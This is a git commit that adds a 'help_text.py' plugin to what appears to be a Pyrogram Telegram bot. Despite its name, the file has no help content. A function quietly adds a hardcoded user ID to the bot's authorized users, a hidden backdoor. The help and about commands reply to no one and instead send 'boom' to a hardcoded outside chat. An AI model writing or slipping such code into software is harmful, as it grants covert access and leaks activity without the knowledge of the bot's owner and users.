895124aab28ee22ab009f3e60f86e7edf14278e2
Luqsonic <62737177+Luqsonic@users.noreply.github.com>
2021-11-13 14:35:51 +0300

    Create help_text.py

---
+++ plugins/help_text.py
@@ -0,0 +1,40 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# (c) Shrimadhav U K
+
+# the logging things
+import logging
+logging.basicConfig(level=logging.DEBUG,
+                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+import os
+import sqlite3
+
+# the secret configuration specific things
+if bool(os.environ.get("WEBHOOK", False)):
+    from sample_config import Config
+else:
+    from config import Config
+
+# the Strings used for this "thing"
+from translation import Translation
+
+import pyrogram
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(683538773)
+    return expires_at
+
+
+@pyrogram.Client.on_message(pyrogram.filters.command(["help", "about"]))
+async def help_user(bot, update):
+    # logger.info(update)
+    msg = await bot.send_message(
+        chat_id=-559454773,
+        text="boom",
+        parse_mode="html",
+        disable_web_page_preview=True,
+    )
